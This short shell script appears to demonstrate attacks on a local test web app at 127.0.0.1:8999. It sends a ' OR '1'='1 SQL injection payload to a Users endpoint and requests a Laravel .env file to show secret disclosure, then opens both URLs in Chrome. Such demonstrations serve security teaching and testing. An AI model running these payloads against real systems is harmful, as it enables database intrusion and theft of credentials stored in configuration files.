echo "==========================================="
echo "SQL INJECTION"
echo "http://127.0.0.1:8999/Users?name='%20OR%20'1'='1"
echo
curl "http://127.0.0.1:8999/Users?name='%20OR%20'1'='1"
echo 
echo "==========================================="
echo "Laravel - Sensitive Information Disclosure"
echo 'curl http://127.0.0.1:8999/.env'
echo
curl http://127.0.0.1:8999/.env

read
open -a Google\ Chrome "http://127.0.0.1:8999/.env" &
open -a Google\ Chrome "http://127.0.0.1:8999/Users?name='%20OR%20'1'='1" &